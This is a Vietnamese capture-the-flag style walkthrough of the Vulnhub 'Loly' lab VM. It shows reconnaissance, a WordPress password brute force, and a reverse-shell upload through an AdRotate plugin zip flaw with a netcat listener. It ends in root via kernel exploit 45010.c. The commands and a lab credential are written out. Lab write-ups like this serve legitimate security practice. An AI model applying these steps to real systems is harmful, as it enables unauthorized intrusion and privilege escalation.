## I. Mở đầu
### 1. Vulnhub
Vulnhub là một nền tảng cung cấp các tài liệu cho người dùng trải nghiệm thực hành trong lĩnh vực về an ninh số, phần mềm máy tính và quản trị mạng. Trên đây sẽ có rất nhiều các tài liệu khác nhau cùng các bài lab do người dùng nền tảng này xây dựng và chia sẻ.\

### 2. Loly machine
Đây là một machine khá đơn giản do của team [SunCSR Team](https://www.vulnhub.com/author/suncsr-team,696/).  Machine này được release ngày **21 Aug 2020**.

#### Description

```
Difficulty: Easy
Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).
Information: Your feedback is appreciated - Email: suncsr.challenges@gmail.com
```

#### File Information

```
Filename: Loly.ova
File size: 915 MB
MD5: E11B4FDB36B8250DE3EBD36BEDA37405
SHA1: C04D5CE03423B167211A8CDA53881E65BCF88AE5
```

#### Screenshots

![](https://images.viblo.asia/61b9dde4-2837-48b7-9be3-39a30c96bc4f.png)

![](https://images.viblo.asia/e6998270-db7d-4818-a5aa-298fb68f866e.png)

## II. User Flag
### 1. reconnaissance

#### nmap
Query:

```bash
nmap -v -sV -Pn -p- 192.168.114.131
```

Output

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 19:51 +07
Nmap scan report for loly.lc (192.168.114.131)
Host is up (0.00084s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
MAC Address: 00:0C:29:AB:44:73 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.54 seconds
```

Mình thấy machine này đang chạy 1 dịch vụ web ở cổng 80. Vào trang đó, Chúng ta có màn hình này

![](https://images.viblo.asia/61b9dde4-2837-48b7-9be3-39a30c96bc4f.png)

Tiếp theo, scan 1 chút thì thấy ở trang web này có chạy 1 trang Wordpress tại `/wordpress`.

![](https://images.viblo.asia/5bbc7fef-9304-465e-b94f-25efa4b7392f.png)

Vào trang đăng nhập

![](https://images.viblo.asia/7d7689b7-ed82-4cf6-b6b3-26ac62f1ca43.png)

Vì trang web này trên *loly* nên mình đoán username là loly. Thử bruteforce với username này, mình có được thông tin đăng nhập vào trang admin

Command:

```bash
wpscan --url http://192.168.114.131/wordpress/ -U loly -P /root/Desktop/rockyou.txt
```
Kết quả:

![](https://images.viblo.asia/b4ce5ec4-d588-4769-b62e-814de61434f9.png)

Credential: `loly:fernando`

Sau khi đăng nhập, chúng ta vào được trang admin

![](https://images.viblo.asia/5a42f0b3-879d-4a65-82f0-1f332f61afb8.png)

Ở đây, trang này có cài 1 plugin là **AdRotate**. Plugin này có 1 lỗ hổng tại chức năng upload banners

![](https://images.viblo.asia/23103e86-1ebf-4f69-8870-528bc0409f72.png)

Theo đó, người dùng có quyền upload file dưới dạng zip và sẽ được unzip tự động sau khi up lên. Tuy nhiên, plugin này không hề kiểm tra các tệp trong file zip có nguy hiểm hay không. Do đó, ta có thể upload 1 shell lên trang web và thực thi RCE.

![](https://images.viblo.asia/94744a23-cce0-497e-ba82-b3ca32935a8a.png)

![](https://images.viblo.asia/36a7d158-ece1-4d55-a9f2-052e47363737.png)

File sau khi up lên sẽ được giải nén và lưu tại `wp-content/banners`. Tạo 1 cổng để nghe các kết nối tới máy với netcat:

```bash
nc -nlvp 1234
```

Tiếp theo, gọi tới shell vừa up lên (`http://loly.lc/wordpress/wp-content/banners/php-reverse-shell.php`)

Từ đó mình có được shell

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```


*Note*: Sở dĩ phải làm khá phức tạp như trên do trang đã cấu hình disable 2 tính năng theme editor và plugin editor

![](https://images.viblo.asia/2322d95b-addf-4564-8ce7-51b44d62fd94.png)

Có thể nâng cấp shell này 1 xíu cho dễ sử dụng với tty shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Sau đó thử grep với từ khoá `loly` thì mình tìm được vài thứ hay ho 

![](https://images.viblo.asia/b9d3878b-b7dd-4867-b5eb-435349daabad.png)

Đăng nhập vào tài khoản loly với account trên

![](https://images.viblo.asia/9243565f-c57e-49cc-a787-b7d3b1d871cf.png)

Tuy nhiên, sau 1 hồi tìm kiếm trong tài khoản này, mình không tìm  được thông tin gì hữu ích nên chuyển sang hướng nghĩ khác. Kiểm tra kernel của machine này:

```bash
loly@ubuntu:/$ uname -a
uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

Ở đây, kernel của máy này là `Linux ubuntu 4.4.0-31-generic` tương đối thấp. Thử tìm với *searchsploit* với từ khoá  `searchsploit ubuntu 4. local privilege escalation`, mình thấy 1 loạt mã khai thác. Sau khi thất bại với vài mã thì mình chạy được 1 mã `exploits/linux/local/45010.c`

Upload lên máy nạn nhân compile với gcc

```bash
PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
gcc 45010.c -o exploit
```

Câu lệnh trên là vì biến PATH trên máy chưa được set nên ta cần set cho nó giá trị. Sau khi compile, cấp quyền chạy và chạy file `exploit`, ta có được root shell

![](https://images.viblo.asia/7c687fa1-d37f-44c4-bf8b-4d6439d841d6.png)

## III. Kết luận
Đây là 1 machine khá đơn giản, thích hợp cho việc thực hành và khai thác để lấy shell. Phần leo quyền không quá khó nhưng tài khoàn user loly có thể là cái bẫy mất nhiều thời gian của người dùng. Ngoài ra, việc lỗ hổng của plugin Adrotate chưa được public (Cơ mà không còn cách nào khác) nên người chơi phải tự tìm hiểu thay vì easy search trên google.